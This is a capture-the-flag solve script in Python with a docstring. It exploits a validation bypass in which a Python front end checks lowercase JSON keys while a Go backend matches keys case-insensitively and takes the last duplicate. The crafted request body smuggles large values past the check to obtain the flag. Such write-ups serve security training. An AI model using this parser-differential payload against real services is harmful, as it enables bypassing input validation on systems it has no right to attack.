#!/usr/bin/env python3
"""
beat-the-alpaca-lord — AlpacaHack Daily 2026-07-15

Flask front caps atk+int+luk <= 500 and def+dex <= 500 (checks lowercase keys),
then forwards the SAME JSON to a Go `calc` service that requires each of those
sums >= 1000. Contradiction — unless the two parsers disagree.

Go's encoding/json matches struct fields **case-insensitively**, and when a key
appears multiple times the LAST occurrence wins. So include lowercase keys with
tiny values (which Python validates and sums) followed by Uppercase duplicates
with large values (which Go, case-insensitively, uses). Python passes; Go sees
the big numbers and prints the flag.

Usage: python3 solve.py <host> <port>
"""
import http.client, sys, re

HOST, PORT = sys.argv[1], int(sys.argv[2])
body = ('{"atk":1,"int":1,"luk":1,"def":1,"dex":1,'
        '"Atk":1000,"Int":1000,"Luk":1000,"Def":1000,"Dex":1000}')
c = http.client.HTTPConnection(HOST, PORT, timeout=15)
c.request("POST", "/api/fight", body, {"Content-Type": "application/json"})
txt = c.getresponse().read().decode(errors="replace")
c.close()
m = re.search(r"Alpaca\{[^}]*\}", txt)
print(m.group(0) if m else txt)
